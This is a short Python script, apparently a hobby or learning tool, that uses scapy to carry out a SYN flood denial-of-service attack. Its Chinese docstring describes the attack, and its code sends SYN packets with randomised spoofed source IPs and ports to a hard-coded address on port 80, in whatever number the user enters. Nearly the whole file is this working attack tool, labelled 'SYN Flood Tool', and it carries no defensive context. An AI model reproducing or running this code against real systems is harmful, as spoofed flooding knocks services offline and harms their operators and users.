from scapy.all import *
import random

"""
SYN泛洪攻击(SYN Flood)是一种比较常用的DoS方式之一。通过发送大量伪造的Tcp连接请求，使被攻击主机资源耗尽(通常是CPU满负荷或者内存不足) 的攻击方式。
"""

# 生成随机的IP
from scapy.layers.inet import TCP, IP


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for i in range(4))))
    return ip


# 生成随机端口
def randomPort():
    port = random.randint(1000, 10000)
    return port


# syn-flood
def synFlood(count, dstIP, dstPort):
    total = 0
    print("Packets are sending ...")
    for i in range(count):
        # IPlayer
        srcIP = randomIP()
        dstIP = dstIP
        IPlayer = IP(src=srcIP, dst=dstIP)
        # TCPlayer
        srcPort = randomPort()
        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags="S")
        # 发送包
        packet = IPlayer / TCPlayer
        send(packet)
        total += 1
    print("Total packets sent: %i" % total)


# 显示的信息
def info():
    print("#" * 30)
    print("# Welcome to SYN Flood Tool  #")
    print("#" * 30)
    # 输入目标IP和端口
    # dstIP = input("Target IP : ")
    dstIP = "192.168.137.96"
    # dstPort = int(input("Target Port : "))
    dstPort = 80
    return dstIP, dstPort


if __name__ == '__main__':
    dstIP, dstPort = info()
    count = int(input("Please input the number of packets："))
    synFlood(count, dstIP, dstPort)